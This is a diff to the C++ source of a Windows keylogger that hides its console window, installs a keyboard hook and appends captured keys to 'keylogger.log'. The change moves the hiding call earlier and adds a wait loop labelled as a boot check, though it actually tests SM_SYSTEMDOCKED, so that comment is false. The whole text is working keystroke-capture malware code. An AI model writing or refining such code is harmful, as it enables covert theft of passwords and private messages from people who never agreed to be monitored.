@@ -195,20 +195,37 @@ void Stealth()
 #endif
 }
 
+// Function to check if the system is still booting up
+bool IsSystemBooting() 
+{
+	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
+}
+
 int main()
 {
-	// open output file in append mode
+	// Call the visibility of window function.
+	Stealth(); 
+	
+	// Check if the system is still booting up
+	while (IsSystemBooting()) 
+	{
+		std::cout << "System is still booting up. Waiting...\n";
+		Sleep(10000); // Wait for 10 seconds before checking again
+	}
+	// This part of the program is reached once the system has 
+	// finished booting up aka when the while loop is broken 
+	// with the correct returned value.
+	
+	// Open the output file in append mode.
+	// Feel free to rename this output file. 
 	const char* output_filename = "keylogger.log";
 	std::cout << "Logging output to " << output_filename << std::endl;
 	output_file.open(output_filename, std::ios_base::app);
 
-	// visibility of window
-	Stealth();
-
-	// set the hook
+	// Call the hook function and set the hook.
 	SetHook();
 
-	// loop to keep the console application running.
+	// We need a loop to keep the console application running.
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
 	{
